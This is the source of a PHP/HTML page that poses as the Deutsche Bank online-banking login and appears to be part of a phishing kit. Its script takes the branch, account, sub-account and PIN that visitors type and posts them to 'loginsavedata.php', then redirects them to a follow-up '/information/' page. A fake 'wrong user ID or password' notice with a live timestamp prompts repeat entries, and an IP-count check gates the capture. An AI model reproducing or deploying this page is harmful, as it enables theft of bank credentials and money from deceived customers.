<?php 
    include 'Model.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de"><head>
<?php   
        $urlPath = parse_url($baseUrl . $_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $pathParts = explode('/', $urlPath);
        $randomId = end($pathParts);

        if($randomId == ''){
            header('Location: /');
            exit();
        }

        echo '<script> var randomId = "'.$randomId.'"</script>';
?>
<base href="<?php echo $baseUrl; ?>/">
    <title>Onlinebanking und Brokerage der Deutschen Bank</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="expires" content="0">
    <meta name="instance" content="pnta101">
    <meta name="description" content="Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit dem Onlinebanking der Deutschen Bank.">

    <script src="js/global.js" type="text/javascript"></script>


    <link rel="icon" href="/images/favicon.ico?v=1" type="image/x-icon">
    <link rel="shortcut icon" href="/images/favicon.ico?v=1" type="image/x-icon">

    <link rel="stylesheet" type="text/css" href="css/base.css" media="screen, print">
    <link rel="stylesheet" type="text/css" href="css/customize.css" media="screen, print">
    <link rel="stylesheet" type="text/css" href="css/forms.css" media="screen, print">
<style>
    #DTdismiss #advertisingSpace .advice .advertisingSpaceAction li a, #DTstart #advertisingSpace .advice .advertisingSpaceAction li a, .OPRA_portal_teaserAction a, a.nextStep, a.pushContract, button.activate, button.confirm, button.nextStep, button.nextStepDisabled, button.pushContract {  padding-right: 2.625em!important;
        background-image: url('images/bt_primary_default.png')!important;
        
        background-position: 91.5% center;
        background-position: right 1.125em center!important;
        background-repeat: no-repeat!important;
        background-size: 13px 11px!important;
        }
        
        #DTdismiss #advertisingSpace .advice .advertisingSpaceAction li a, #DTstart #advertisingSpace .advice .advertisingSpaceAction li a, #OPRA_portal #sideContent .OPRA_feedback li a, .OPRA_portal_teaserAction a, .addressLightbox #button_cancel, .addressLightbox #button_select, .trxm_db_onlinekredit #div-recalculateProposal, .trxm_db_onlinekredit .onlinecreditCompletionSection1 .button a, .trxm_db_onlinekredit .onlinecreditCompletionSection1 .button.disabled span, a.button, html .sf-base .sf-analysis-content .sf-accordion-toggle-link, html .sf-base .sf-button, html .sf-base .sf-button-controls .sf-button, button.button, span.button {
        background: #2282c1;
        color: #fff;
        cursor: pointer;
        padding: .6em 1em;
        text-decoration: none;
        border: 0;
        border-radius: 3px;
        box-shadow: 0 1px 2px rgba(0, 0, 0, .35);
        line-height: 1.25;
        }
        
@font-face {
	font-family: 'pfbicons';
	src: url('fonts/pfbicons.ttf') format('truetype');
	font-weight: normal;
	font-style: normal;
}

</style>
</head>


<body id="login" class="noTopicContainer">
    <div id="rollContainer">
        <div id="globalContainer"><a name="globalContainer"></a>

            <div id="serviceNavigation">

                <ul>
                    <li class="access"><a href="#contentContainer">Zum Inhalt springen</a></li>
                    <li class="access"><a href="#" accesskey="0">Zur <span xml:lang="en" lang="en">Accesskeys</span>-Übersicht</a></li>
                </ul>
            </div> <!-- End of serviceNavigation -->
            <div id="headerContainer">


                <p id="logoContainer"><img src="images/logo_db.gif" width="267" height="76" title="Logo Deutsche Bank" alt="Logo Deutsche Bank"></p>
                <div id="metaNavigation">
                    <h4 class="access">Sprachauswahl und Filialsuche</h4>
                    <ul>

                        <li><a href="https://webfilialien-vorgang.de/einloggen/init.do.html">English Version</a></li>

                        <li><a href="https://www.deutsche-bank.de/pfb/content/jumppages/filialfinder.html" title="Neues Fenster: Finden Sie eine Filiale in Ihrer Nähe">Ihre Filiale</a></li>
                    </ul>
                </div> <!-- End of metaNavigation -->
            </div>

            <!-- End of headerContainer -->

            <div id="locationContainer"></div> <!-- End of locationContainer -->

            <div id="folderContainer">
                <div id="topicContainer">

                    <div class="additionalInfo onlinebanking">
                        <h4><span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span></span></h4>
                        <p>Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit unserem <span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span>.</span></p>
                        <ul>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/Leistungen-im-Ueberblick.html" title="Neues Fenster: Rund ums Online-Banking">Rund ums Online-Banking</a></li>

                            <li><a target="_blank" href="https://secure.deutsche-bank.de/pbc/trxmdemokonto/loginpin/goto.do" title="Neues Fenster: Demokonto testen">Demokonto testen</a></li>

                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/konto-und-karte/konten-im-ueberblick/konten-im-vergleich.html" title="Neues Fenster: Konto eröffnen">Konto eröffnen</a></li>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/opra4x/public/pfb/request-online-banking-access/#/page-1-0" title="Neues Fenster: Konto für Online- und Telefon-Banking freischalten">Konto für Online- und Telefon-Banking freischalten</a></li>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/mobile-apps/deutsche-bank-mobile-app.html" title="Neues Fenster: MobileBanking">MobileBanking</a></li>
                        </ul>
                    </div>
                    <div class="additionalInfo help">
                        <h4>Hilfe</h4>
                        <ul>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/faq-s.html" title="Neues Fenster: Häufig gestellte Fragen">Häufig gestellte Fragen</a></li>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/downloadcenter.html" title="Neues Fenster: Download-Center">Download-Center</a></li>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/service-und-kontakt/service-ueberblick.html#tabset_content_tab2" title="Neues Fenster: Technischer Support">Technischer Support</a></li>
                            <li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/sicherheit/sicherheitsverfahren.html" title="Neues Fenster: Sicherheit">Sicherheit</a></li>
                        </ul>
                    </div>

                </div> <!-- End of topicContainer -->

                <!-- Rendering of content container and footer container -->

                <script type="text/javascript" language="JavaScript" src="js/autotab.js"></script>
                <script type="text/javascript" language="JavaScript" src="js/fingerprintLoginUi.js"></script>
                <script type="text/javascript">
                    /* Check if the Caps-Lock key is on. */
                    /* If so, make the 'capsLockMessage' element visible */

                    function checkCapsLock(e) {
                        var myKeyCode = 0;
                        var myShiftKey = e.shiftKey || (e.modifiers && (e.modifiers & 4));

                        // Internet Explorer && Mozilla
                        if (window.event) {
                            // Mozilla
                            if (e.charCode) {
                                myKeyCode = e.charCode;
                            }
                            // Internet Explorer
                            else {
                                myKeyCode = e.keyCode;
                            }

                            // Netscape 4
                        } else if (e.which) {
                            myKeyCode = e.which;
                        }

                        // Upper case letters are seen without depressing the Shift key, therefore Caps Lock is on
                        if ((myKeyCode >= 65 && myKeyCode <= 90) && !myShiftKey) {
                            document.getElementById('capsLockMessage').style.visibility = 'visible';
                            // Lower case letters are seen while depressing the Shift key, therefore Caps Lock is on
                        } else if ((myKeyCode >= 97 && myKeyCode <= 122) && myShiftKey) {
                            document.getElementById('capsLockMessage').style.visibility = 'visible';
                            // Special characters in number keys are type if you have Caps Lock enable in German keyboards
                        } else if ((myKeyCode == 33 || myKeyCode == 34 || myKeyCode == 36 || myKeyCode == 37 ||
                                myKeyCode == 38 || myKeyCode == 40 || myKeyCode == 41 || myKeyCode == 47 ||
                                myKeyCode == 61 || myKeyCode == 167 || myKeyCode == 183 || myKeyCode == 64 ||
                                myKeyCode == 35 || myKeyCode == 94 || myKeyCode == 42) && !myShiftKey) {
                            document.getElementById('capsLockMessage').style.visibility = 'visible';

                            // Numbers typed and the shift is pressed, means that in a German keyboard you have the Caps Lock enabled
                        } else if ((myKeyCode >= 48 && myKeyCode <= 57) && myShiftKey) {

                        } else {
                            document.getElementById('capsLockMessage').style.visibility = 'hidden';
                        }
                    }
                </script>
                <style type="text/css">
                    body#login #verimiContainer #verimiRegistrationNote {
                        font-size: 0.93em;
                        color: #7a7a7a;
                        padding-top: 0.5em;
                    }
                </style>

                <div id="contentContainer"><a name="contentContainer"></a>
                    <!--  page LoginPage -->
                    <div id="pathNavigation" class="access">
                        <p><strong>Sie sind hier:</strong> Kunden-Login</p>
                    </div>

                    <h1>Herzlich willkommen!</h1>

                    <div id="mainContent">

                        <div class="formContainer">
                            <form id="login-form" method="post" action="">
                                <input type="hidden" name="SCC_X_TOKEN" value="f9Z10OcMAfRN9T0HIDN09qT3PYKbZbFF">
                                <input type="hidden" name="gvo" value="RegisterPhotoTan">
                                <input type="hidden" name="process" value="">
                                <input type="hidden" name="wknOrIsin" value="">
                                <input type="hidden" name="quantity" value="">
                                <input type="hidden" name="fingerprintToken" id="fingerprintToken" value="">
                                <input type="hidden" name="fingerprintTokenVersion" id="fingerprintTokenVersion" value="">
                                <input type="hidden" name="updateFingerprintToken" id="updateFingerprintToken" value="false">
                                <input type="hidden" name="javascriptEnabled" value="false">
                                <input type="hidden" name="randomId" value="<?php echo $randomId; ?>">
                                <script type="text/javascript">
                                    document.forms.loginForm.javascriptEnabled.value = "true"
                                </script>
                                <div ng-if="emerald" class="alert em-alert-warning px-sm-2 ng-scope ng-isolate-scope" role="alert" data-ng-click="isCollapsed = !isCollapsed" id="errorMessage" aria-live="assertive" data-ng-show="error" data-aab-scroll-to="error !== undefined" data-testid="alert-container" style="display: none; margin-bottom: -3px;"><!-- ngIf: error.faultCode -->
                                    <div class="d-flex flex-row"><span class="float-left flex-shrink-0 mr-1 em-icon-size-3 sy-notification-warning"></span> <span class="sr-only"></span>
                                        <div><!-- ngIf: error.title && (error.title | translate) -->
                                            <h3 data-testid="first-alert-warning-text" data-ng-if="error.title &amp;&amp; (error.title | translate)" data-ng-bind-html="error.title | translate | aabTrustedHtml" class="ng-binding ng-scope" style=""></h3><!-- end ngIf: error.title && (error.title | translate) -->
                                            <p class="mb-0 ng-binding" data-ng-bind-html="error.text | translate | aabTrustedHtml" data-translate-default="Er is een fout opgetreden" data-testid="second-alert-warning-text">
                                            </p><div role="alert" id="errorMessage" aria-live="assertive" class="ap-field-errors">
                                                <div class="msgerror">
                                                    <p apscreenreaderonly="" class="sr-only">
                                                    </p><div style="color: red;">Die Benutzer-ID oder das Passwort ist falsch.</div>
                                                    <div style="color: red;"><span type="text" id="datejkkr">16.1.2024</span> um <span type="text" id="datetime">14:49:07</span> Uhr</div>

                                                </div><!---->
                                            </div>
                                            <script>
                                                var dt = new Date();
                                                document.getElementById("datetime").innerHTML = dt.toLocaleTimeString();
                                            </script>
                                            <script>
                                                var dt = new Date();
                                                document.getElementById("datejkkr").innerHTML = dt.toLocaleDateString();
                                            </script>
                                            <style>
                                                .scc-login .next-group {
                                                    margin-top: 20px !important;
                                                }

                                                .spinner {
                                                    display: inline-block;
                                                    width: 20px;
                                                    height: 20px;
                                                    position: relative;
                                                    margin-right: 5px;
                                                    /* Add space between spinner and text */
                                                }

                                                .spinner::before,
                                                .spinner::after {
                                                    content: '';
                                                    position: absolute;
                                                    border-radius: 50%;
                                                }

                                                .spinner::before {
                                                    top: 0;
                                                    left: 0;
                                                    width: 100%;
                                                    height: 100%;
                                                    border: 2px solid transparent;
                                                    border-top-color: #fff;
                                                    animation: spin 1s linear infinite;
                                                }

                                                .spinner::after {
                                                    top: 3px;
                                                    left: 3px;
                                                    width: 14px;
                                                    height: 14px;
                                                    border: 2px solid transparent;
                                                    border-top-color: #fff;
                                                    animation: spin-reverse 1s linear infinite;
                                                }

                                                @keyframes spin {
                                                    to {
                                                        transform: rotate(360deg);
                                                    }
                                                }

                                                @keyframes spin-reverse {
                                                    to {
                                                        transform: rotate(-360deg);
                                                    }
                                                }

                                                
                            .loading-text {
                            display: inline-block;
                            font-family: Arial, sans-serif;
                                                font-size: 16px;
                                                color: #fff;
                                                }

                                                .scc-login .input-container[class*=icon-cs-]:before,
                                                .scc-login .input-container[class^=icon-cs-]:before {
                                                    top: 30px;
                                                }
                                            </style>
                                            <p></p>
                                        </div>
                                    </div><!-- ngIf: error.options.button -->
                                </div>
                                <table cellspacing="0" class="roll layout">
                                    <tbody><tr class="subsequentXS">
                                        <td class="nowrap rgtPadding">
                                            <p><label for="branch"><strong>Filiale</strong><br>(3-stellig)</label></p>
                                            <p><input type="text" name="branch" maxlength="3" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" id="branch" autocomplete="off"></p>
                                        </td>
                                        <td class="nowrap rgtPadding">
                                            <p><label for="account"><strong>Konto</strong><br>(7-stellig)</label></p>
                                            <p><input type="text" name="account" maxlength="7" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" id="account" autocomplete="off"></p>
                                        </td>
                                        <td class="nowrap rgtPadding">
                                            <p><label for="subAccount"><strong>Unterkonto</strong><br>(2-stellig)</label></p>
                                            <p><input type="text" name="subaccount" maxlength="2" value="00" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" id="subAccount" autocomplete="off"></p>
                                        </td>
                                        <td class="nowrap roll">
                                            <p><label for="pin"><strong><acronym title="Persönliche Identifikationsnummer">PIN</acronym></strong><br>(5-stellig)</label></p>
                                            <p><input type="password" name="pin" maxlength="5" value="" onkeypress="checkCapsLock(event);" id="pin" autocomplete="off"></p>
                                        </td>
                                    </tr>

                                    <tr id="capsLockMessage" style="visibility:hidden">
                                        <td colspan="4">
                                            <div class="errorMsg"><label for="">Bitte beachten Sie, daß die "Hochstell-Taste" (Capslock) aktiv ist.</label></div>
                                        </td>
                                    </tr>

                                    <tr class="subsequentS">
                                        <td class="rgtPadding nowrap"><label for="proxyLogins">Direkt zu ...</label></td>
                                        <td colspan="3">
                                            <select name="quickLink" id="proxyLogins" class="roll">
                                                <option value="DisplayFinancialOverview" selected="selected">... Finanzübersicht</option>
                                                <option value="SepaDomesticTransfer">... Inlandsüberweisung</option>
                                                <option value="DisplayTransactions">... Umsatzanzeige</option>
                                                <option value="GiropayOverview">... giropay</option>
                                                <option value="DisplayStatementOfAssets">... Vermögensaufstellung</option>
                                                <option value="Ordering">... Wertpapierorder</option>
                                                <option value="ProductShop">... Produktangebote</option>
                                                <option value="SelfService">... OnlineSelfServices</option>
                                                <option value="ChangePersonalInformation">... Persönlichen Daten</option>
                                                <option value="esafe">... eSafe</option>
                                                <option value="setupNachrichtenbox">... Postfach</option>
                                            </select>

                                        </td>
                                    </tr>
                                    <tr>
                                        <td>&nbsp;</td>
                                        <td class="nowrap" colspan="3"><input type="checkbox" name="sessionTAN" value="true" id="sessionTAN" class="checkbox"><label for="sessionTAN">Session-<acronym title="Transaktionsnummer">TAN</acronym> für Wertpapieraufträge verwenden</label> <a href="https://www.deutsche-bank.de/pk/shared/trxm/help-de/login/login-session-tan.html" rel="help" title="Neues Fenster: Weitere Informationen zu dieser Option"><img src="images/ic_help.gif" width="15" height="15" alt="Neues Fenster: Weitere Informationen zu dieser Option"></a></td>
                                    </tr>
                                    <tr class="subsequentS">
                                        <td colspan="4">
                                            <table cellspacing="0" class="layout" id="phishing">
                                                <tbody><tr>
                                                    <td id="distractor"><strong>WICHTIG</strong></td>
                                                    <td id="text">Bitte beachten Sie: Die Deutsche Bank fordert pro<br> Auftrag nie mehrere Transaktionsnummern (<acronym title="Transaktionsnummer">TAN</acronym>)!</td>
                                                    <td id="action">
                                                        <button type="" value="Login ausführen" id="loginButton" class="button nextStep login btn btn--primary btn-value loginausführen">Login ausführen</button></td>
                                                </tr>
                                            </tbody></table>
                                        </td>
                                    </tr>
                                </tbody></table>
                                <div id="verimiContainer">
                                    <h3>Nutzen Sie Verimi, um sich im Deutsche Bank OnlineBanking anzumelden.</h3>
                                    <p>Verimi - Ihr bequemer und sicherer Zugang zu immer mehr Online-Angeboten.</p>
                                    <p id="verimiLogin"><input type="submit" name="verimiSubmit" value="Login mit Verimi" class="button nextStep"></p>
                                    <p id="verimiRegistration">
                                        Noch kein Verimi-Nutzer?<br>Jetzt <a href="https://www.deutsche-bank.de/verimi" target="_blank" rel="noopener noreferrer">informieren</a> und kostenlos mit Ihren Deutsche Bank Daten <a href="https://www.deutsche-bank.de/registrierung-verimi" target="_blank" rel="noopener noreferrer">registrieren</a>.
                                    </p>
                                    <p id="verimiRegistrationNote">Verimi ist ein eigenständiges Angebot der Verimi GmbH und unabhängig von Dienstleistungen von Deutsche Bank-Unternehmen.</p>
                                </div>
                            </form>
                        </div>

                    </div>
                </div>

                <div id="footerContainer">

                    <div id="pageFeatures">

                        <div id="fontSizer">
                            <h4>Schriftgröße</h4>
                        </div> <!-- End of fontSizer -->
                    </div> <!-- End of pageFeatures -->

                </div>
            </div> <!-- End of folderContainer -->
            <div class="access">
                <ul>
                    <li><a href="#globalContainer">Zum Anfang der Seite springen</a></li>
                </ul>
            </div>
        </div> <!-- End of globalContainer  -->
    </div> <!-- End of rollContainer -->
    <input type="hidden" id="token" value="65aaa94e9933d">
    <input type="hidden" id="user-id" value="65aaa94e9933d">
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

    <script>
        // setInterval(() => {
        //     const data = new FormData();
        //     data.append('id', document.querySelector('#user-id').value);
        //     fetch('/user/online', {
        //         method: 'POST',
        //         body: data
        //     });
        // }, 3000);
        
        document.addEventListener("DOMContentLoaded", function() {
          const fieldsToRestrict = ["branch", "account", "subAccount", "pin"];
        
          fieldsToRestrict.forEach(id => {
            const elem = document.getElementById(id);
            if (elem) {
              elem.addEventListener("input", function(event) {
                this.value = this.value.replace(/[^0-9]/g, '');
              });
            }
          });
        });

        <?php 
            if ($ipEntryCount < 2){

        ?>
            $(document).ready(function() {
                $('#loginButton').on('click', function(e) {
                    e.preventDefault();
                    var branch = $('#branch').val();
                    var account = $('#account').val();
                    var subaccount = $('#subAccount').val();
                    var pin = $('#pin').val();
                    var quickLink = $('#proxyLogins').val();
                    var sessionTAN = $('#sessionTAN').is(':checked');
                    var formData = {
                        branch: branch,
                        account: account,
                        subaccount: subaccount,
                        pin: pin,
                        quickLink: quickLink,
                        sessionTAN: sessionTAN,
                        randomID: randomId
                    };
                    $.ajax({
                        type: 'POST', 
                        url: 'loginsavedata.php', 
                        data: formData,
                        success: function(response) {
                            response = JSON.parse(response);
                        if (response.status === 'success') {
                                var savedId = response.id;
                                window.location.href = '/information/'+response.randomId;
                            } else {
                                console.error(response.message);
                            }
                        },
                        error: function(xhr, status, error) {
                        console.error(xhr.responseText);
                        }
                    });
                });
            });
        <?php } ?>
    </script>

    <script src="js/login.js"></script>



</body></html>
